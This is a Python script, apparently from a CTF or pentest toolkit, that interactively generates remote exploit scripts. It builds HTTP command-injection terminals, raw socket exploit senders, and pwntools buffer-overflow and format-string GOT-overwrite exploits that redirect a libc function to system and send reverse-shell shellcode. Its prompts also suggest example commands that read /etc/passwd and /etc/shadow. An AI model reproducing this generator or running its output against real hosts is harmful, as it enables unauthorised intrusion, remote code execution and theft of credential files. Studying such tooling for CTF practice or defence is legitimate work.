#!/usr/bin/env python

def PWN_ELF_FUNCT():
	try:
		print("Digit a exploit filename to create")
		FILENAME = raw_input("(example, exploit.py): ")
		if FILENAME != "":
			HEADER = "from pwn import *\nimport urllib\n\n"
			print("Digit the remote architecture")
			ARCH = raw_input("(example, i386): ")
			if ARCH != "":
				HEADER = HEADER + "context.arch = \'" + ARCH + "\'\n"
				print("Digit a log_level (optiona, empty to jump this step)")
				LOG_LEV = raw_input("(example, debug): ")
				if LOG_LEV != "":
					HEADER = HEADER + "context.log_level = \'" + LOG_LEV + "\'\n"
				HEADER = HEADER + "\n"
				print("Digit the remote IP target; you can use an url, if you add in /etc/hosts the IP target and an url to map")
				IP = raw_input("(example, domain.topdom or 10.10.10.13): ")
				if IP != "":
					HEADER = HEADER + "HOST = \"" + IP + "\"\n"
					print("Digit the remote port target")
					PORT = raw_input("(example, 9999): ")
					if PORT  != "":
						HEADER = HEADER + "PORT = \"" + PORT + "\"\n\n"
						print("Digit the path to server binary")
						BIN = raw_input("(example, bin/http-server): " )
						if BIN != "":
							HEADER = HEADER + "BINARY = ELF(\'" + BIN + "\')\n"
							print("Digit the path of libc stored in remote IP (optional, empty to jump this step)")
							LIBC = raw_input("(example, bin/libc-2.27.so: ")
							if LIBC != "":
								HEADER = HEADER + "LIBC = ELF(\'" + LIBC + "\')\n\n"
								print("Digit a LIBC memory base (it should be required)")
								LIBCBASE = raw_input("(example, 0xf7d9f000): ")
								if LIBCBASE != "":
									HEADER = HEADER + "LIBCBASE = " + LIBCBASE + "\n"
							HEADER = HEADER + "\n"
							print("Digit a value to set an offset (optional, empty to jump this step")
							OFFSET = raw_input("(example, 23) : ")
							if OFFSET != "":
								HEADER = HEADER + "OFFSET = " + OFFSET + "\n"
							print("Digit a memory base value for " + BIN + " binary")
							BINBASE = raw_input("(example, 0x56610000): ")
							if BINBASE != "":
								HEADER = HEADER + "BINBASE = " + BINBASE + "\n\n"
								print("Digit the Global Offset Table value (c function)")
								GOT = raw_input("(example, puts): ")
								if GOT != "":
									HEADER = HEADER + "EXPLOIT = {(BINBASE + BINARY.got[\'" + GOT + "\']): (LIBCBASE + "
									print("Digit the libc symbol")
									LIBCSYM = raw_input("(example, system): ")
									if LIBCSYM != "":
										HEADER = HEADER + "LIBC.symbols[\'" + LIBCSYM + "\'])}\nPAYLOAD = fmtstr_payload(OFFSET, EXPLOIT)\n\n"
										print("Digit a command to send to target; you can use {IFS} (Internal Field Separator)")
										CMD = raw_input("(example, echo /etc/passwd{IFS}echo /etc/shadow): ")
										if CMD != "":
											HEADER = HEADER + "CMD = \"" + CMD + "\"\n"
											HEADER = HEADER + "IO = remote(HOST, PORT"
											if LOG_LEV != "":
												HEADER = HEADER + ", level=\'" + LOG_LEV + "\'"
											HEADER = HEADER + ")\nIO.send(f\"{CMD} /{urllib.parse.quote(PAYLOAD)}\\n\\n\")\nIO.close()"
											f = open(FILENAME, 'w')
											f.write(HEADER)
											f.close()
	except:
		raise

def PWN_FUNCT():
	try:
		print("Digit a exploit filename to create")
		FILENAME = raw_input("(example, exploit.py): ")
		if FILENAME != "":
			HEADER = "from pwn import *\n\n"
			print("Digit a OS")
			OS = raw_input("(example, linux): ")
			if OS != "":
				print("Digit an architecture")
				ARCH = raw_input("(example, i386): ")
				if ARCH != "":
					HEADER = HEADER + "context(os=\"" + OS + "\", arch=\"" + ARCH + "\")\n"
					print("Digit the target IP")
					TARGET = raw_input("(examples, 10.10.10.1): ")
					if TARGET != "":
						print("Digit the target port")
						PORT = raw_input("(default, 80: ")
						if PORT == "":
							PORT = "80"
						HEADER = HEADER + "HOST = \"" + TARGET + "\"\nPORT = " + PORT + "\n\n"
						print("Digit a junk inside double quotes \"; you can use multiplicator ")
						JUNK = raw_input("(example, \"\\xCC\" * 32): ")
						if JUNK != "":
							HEADER = HEADER + "JUNK = " + JUNK + "\n\n"
							print("Digit a memory address leaked, you can add a value to add")
							MEM = raw_input("(example, 0xffebb890+32): ")
							if MEM != "":
								HEADER = HEADER + "MEM = p32(" + MEM + ")\n\n"
								print("Digit a buffer or reverse shell; (NOTE: revshell should be in hex values)")
								BUF = raw_input("BUFFER: ")
								if BUF != "":
									HEADER = HEADER + "BUF = \"" + BUF + "\"\n\n"
									HEADER = HEADER + "p = remote(" + TARGET + ", " + PORT + ")\n\n"

									print("Digit a message you should receive before send a command")
									REC_ONE = raw_input("(example, OK): ")
									if REC_ONE != "":
										HEADER = HEADER + "p.recvuntil(\"" + REC_ONE + "\")\n"

									print("Digit a command to send (example, DEBUG)")
									CMD_ONE = raw_input("(empty to inject JUNK + MEMORY + BUFFER/REVERSE_SHELL): ")
									HEADER = HEADER + "p.sendline("
									if CMD_ONE != "":
										HEADER = HEADER + "\"" + CMD_ONE + "\")\n"
									else:
										HEADER = HEADER + "JUNK + MEM + BUF)\n"

									print("Digit a message you should receive before send a command")
									REC_TWO = raw_input("(example, OK Send): ")
									if REC_TWO:
										HEADER = HEADER + "p.recvuntil(\"" + REC_TWO + "\")\n"
									print("Digit a command to send (example, USER admin)")
									CMD_TWO = raw_input("(empty to inject JUNK + MEMORY + BUFFER/REVERSE_SHELL): ")
									HEADER = HEADER + "p.sendline("
									if CMD_TWO != "":
										HEADER = HEADER + "\"" + CMD_TWO + "\")\n"
									else:
										HEADER = HEADER + "JUNK + MEM + BUF)\n"

									print("Digit a message you should receive before send a command")
									REC_THREE = raw_input("(example, OK Send): ")
									if REC_THREE:
										HEADER = HEADER + "p.recvuntil(\"" + REC_THREE + "\")\n"

									print("Digit a command to send (example, USER admin)")
									CMD_THREE = raw_input("(empty to inject JUNK + MEMORY + BUFFER/REVERSE_SHELL): ")
									HEADER = HEADER + "p.sendline("
									if CMD_THREE != "":
										HEADER = HEADER + "\"" + CMD_THREE + "\")\n"
									else:
										HEADER = HEADER + "JUNK + MEM + BUF)\n"

									f = open(FILENAME, 'w')
									f.write(HEADER)
									f.close()

	except:
		raise

def HTTP_FUNCT():
	try:
		print("Digit a exploit filename to create")
		FILENAME = raw_input("(example, exploit.py): ")
		if FILENAME != "":
			HEADER = "#!/usr/bin/env python\n\nimport sys, os"
			print("Digit the target PROTOCOL://IP:PORT/PATH.\nUse {args[0]} in URL if you want use HTTP-GET REQUEST (examples, https://10.10.10.1/{args[0]} or http://10.10.10.2:8000/{args[0]} or https://10.10.10.3:5000/uploads?page={args[0]})")
			TARGET = raw_input("Digit the target host: ")
			EXPLOIT = ""
			REQUEST = ""
			FOOTER = ""
			if TARGET != "":
				HEADER = HEADER + ", requests"
				print("1. GET\n2. POST")
				REQ = raw_input("Choose a type of HTTP REQUEST: ")
				HEADER = HEADER + "\nfrom cmd import Cmd\n\nclass Terminal(Cmd):\n\tprompt = \'>\'\n\n\tdef default(self, args):\n"
				if REQ == "1":
					HEADER = HEADER + "\t\tsession = requests.session()\n\t\tresponse = session.get(\'" + TARGET + "\'"
					COOKIE = raw_input("Digit the Cookie value: ")
					if COOKIE != "":
						HEADER = HEADER + ", cookies=\'" + COOKIE + "\'"
				else:
					print("Digit data HTTP-POST REQUEST (NOTE: using brackets {}\nNOTE: se {args[0]} inside POST DATA")
					DATA = raw_input("(example, {\'Cookie\': \'aCookie\', \'Token\', \'{args[0]}\'}): ")
					if DATA != "":
						HEADER = HEADER + "\t\tresponse = requests.post(\'" + TARGET + "\', data=" + DATA
						print("Digit a protocol proxy")
						PROTOPROXY = raw_input("empty to jump this step: ")
						if PROTOPROXY != "":
							IPPROXY = raw_input("Digit a IP proxy: ")
							if IPPROXY != "":
								HEADER = HEADER + ", proxies={\'" + PROTOPROXY + "\': \'" + IPPROXY + "\'}"
				HEADER = HEADER + ", verify=False).text\n\t\tprint(response)\n\nterm = Terminal()\nterm.cmdloop()"
				f = open(FILENAME, 'w')
				f.write(HEADER)
				f.close()

	except:
		raise


def SOCKET_FUNCT():
	try:
		print("Digit a exploit filename to create")
		FILENAME = raw_input("(example, exploit.py): ")
		if FILENAME != "":
			HEADER = "#!/usr/bin/env python\n\nimport sys, os"
			print("Digit the target IP")
			TARGET = raw_input("(examples, 10.10.10.1: ")
			if TARGET != "":
				PORT = raw_input("Digit a port numbero 1-65535 (default 80): ")
				if PORT == "":
					PORT = "80"
				HEADER = HEADER + ", socket\n\n"
				print("You can choose if you have to digit an exploit or insert a looping Cmd\n1.Cmd\n2.Exploit")
				CHOOSE = raw_input("What do you prefer? ")
				if CHOOSE == "1":
					HEADER = HEADER + "from cmd import Cmd\n"
					EXPLOIT = "class Terminal(Cmd):\n\tprompt = \'>\'\n\n\tdef default(self, args):\n"
				else:
					EXPLOIT = raw_input("Paste or Digit the exploit: ")
					if EXPLOIT != "":
						EXPLOIT = "exploit = \"" + EXPLOIT + "\"\n\n"

				SIZE = raw_input("Digit buffer size (default 1024): ")
				if SIZE == "":
					SIZE = "1024"
				if CHOOSE == "1":
					REQUEST = "\t\tsock.send(args[0])\n"
					REQUEST = REQUEST + "\t\t"
					REQUEST = REQUEST + "recv = sock.recv(" + SIZE + ")\n"
					REQUEST = REQUEST + "\t\t"
					REQUEST = REQUEST + "print(recv)"
					FOOTER = "\n\nsock = socket.socket("
					SOCKTYPE = ""
					print("Digit Address Family and Socket Type")
					SOCKTYPE = raw_input("(example socket.AF_INET, socket.SOCK_STREAM): ")
					if SOCKTYPE != "":
						FOOTER = FOOTER + SOCKTYPE
					FOOTER = FOOTER + ")"
					FOOTER = FOOTER + "\n"
					FOOTER = FOOTER + "sock.connect((\"" + TARGET + "\", " + PORT + "))"
					FOOTER = FOOTER + "\nrecv = sock.recv(" + SIZE + ")\nprint(recv)"
					FOOTER = FOOTER + "\nterm = Terminal()\nterm.cmdloop()"
				else:
					REQUEST = ""
					FOOTER = "sock = socket.socket("
					SOCKTYPE = ""
					print("Digit Address Family and Socket Type")
					SOCKTYPE = raw_input("(example socket.AF_INET, socket.SOCK_STREAM): ")
					if SOCKTYPE != "":
						FOOTER = FOOTER + SOCKTYPE + ")\n"
					FOOTER = FOOTER + "sock.connect((\"" + TARGET + "\", " + PORT + "))"
					FOOTER = FOOTER + "\nrecv = sock.recv(" + SIZE + ")\nprint(recv)"
					FOOTER = FOOTER + "\nsock.send(exploit)"
					FOOTER = FOOTER + "\nrecv = sock.recv(" + SIZE + ")\nprint(recv)"

				f = open(FILENAME, 'w')
				f.write(HEADER + EXPLOIT + REQUEST + FOOTER)
				f.close()
	except:
		raise


#ENTRYPOINT
try:
	print("Digit a type of exploit would create")
	print("1. HTTP REQUEST (POST or GET)\n2. SOCKET (for daemon/service)\n3. PWN (for daemon/service)")
	TIPO = raw_input("Choose a type of exploit: ")
	if TIPO == "1":
		HTTP_FUNCT()
	elif TIPO == "2":
		SOCKET_FUNCT()
	elif TIPO == "3":
		print("You can choose between\n1. simple remote exploitation\n2. urllib and ELF remote exploitation")
		TIPOO = raw_input("Digit a type of PWN exploitation: ")
		if TIPOO == "1":
			PWN_FUNCT()
		else:
			PWN_ELF_FUNCT()
except:
	raise
